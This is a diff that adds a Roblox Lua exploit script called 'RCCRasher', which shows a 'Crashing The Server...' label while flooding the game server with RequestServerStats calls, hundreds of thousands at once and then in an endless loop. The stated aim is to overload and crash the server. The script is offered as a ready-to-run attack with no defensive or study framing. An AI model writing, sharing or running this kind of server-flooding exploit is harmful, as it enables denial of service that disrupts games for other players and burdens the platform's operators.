@@ -1,0 +1,92 @@
+--[[
+
+	RCCRasher
+	Made by @xenqXD
+	v1.0.0
+
+]]
+
+local RCCRasher = Instance.new("ScreenGui")
+local TextLabel = Instance.new("TextLabel")
+
+RCCRasher.Name = "RCCRasher"
+RCCRasher.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+RCCRasher.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+TextLabel.Parent = RCCRasher
+TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel.BorderSizePixel = 10
+TextLabel.Position = UDim2.new(0.16096817, 0, 0.0303030312, 0)
+TextLabel.Size = UDim2.new(0.699999988, 0, 0.200000003, 0)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Crashing The Server..."
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14
+TextLabel.TextTransparency = 1
+TextLabel.TextWrapped = true
+
+local function NACQXGN_fake_script() -- fader
+	local script = Instance.new('LocalScript', RCCRasher)
+
+	-- tuff
+	local ts = game:GetService("TweenService")
+	
+	local label = script.Parent:WaitForChild("TextLabel")
+	
+	local fadeTime = 1
+	local holdTime = 4
+	
+	local fadeInTween = ts:Create(
+		label,
+		TweenInfo.new(fadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		{TextTransparency = 0}
+	)
+	
+	local fadeOutTween = ts:Create(
+		label,
+		TweenInfo.new(fadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+		{TextTransparency = 1}
+	)
+	
+	label.TextTransparency = 1
+	
+	fadeInTween:Play()
+	fadeInTween.Completed:Connect(function()
+		wait(holdTime) -- wait 4 seconds
+		fadeOutTween:Play()
+	end)
+	
+end
+coroutine.wrap(NACQXGN_fake_script)()
+local function DGVNNF_fake_script() -- RCCRasher.crasher 
+	local script = Instance.new('LocalScript', RCCRasher)
+	
+	local network = game:GetService("NetworkClient")
+	local replicator = network.ClientReplicator
+	
+	-- main
+	for i = 1, 674122 do
+		replicator:RequestServerStats(true)
+	end
+	
+	wait(1)
+	
+	-- looping for max overload
+	
+	while true do
+		for i = 1, 1337 do
+			replicator:RequestServerStats(true)
+		end
+	end
+	
+	-- end
+	
+	wait(5)
+	game:GetService("Players").LocalPlayer:Kick("[RCCRasher] Succesfully ran the script. Please rejoin and if the RCC isn't lagging, please run the script again!")
+end
+coroutine.wrap(DGVNNF_fake_script)()
+
+print("done lel")
